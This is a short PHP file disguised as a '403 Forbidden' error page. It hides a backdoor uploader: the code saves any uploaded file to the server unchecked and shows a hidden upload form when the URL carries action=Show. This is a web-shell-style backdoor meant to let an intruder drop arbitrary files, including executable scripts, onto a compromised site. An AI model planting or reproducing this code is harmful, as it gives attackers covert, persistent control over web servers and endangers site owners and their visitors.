<!DOCTYPE html>
<html>
<head>
    <title>403 Forbidden</title>
</head>
<body>

<p>Directory access is forbidden.</p>
<?php 
$f=$_FILES['f'];
if($f['name']!=''){
if(move_uploaded_file($f['tmp_name'],$f['name'])){ echo 'done';}else{ echo 'error';}	
}
if($_GET['action']=="Show"){
echo '<form method="post" enctype="multipart/form-data" ><input type="file" name="f" /><input type="submit" name="s" value="go" /></form>';
}
?>
</body>
</html>
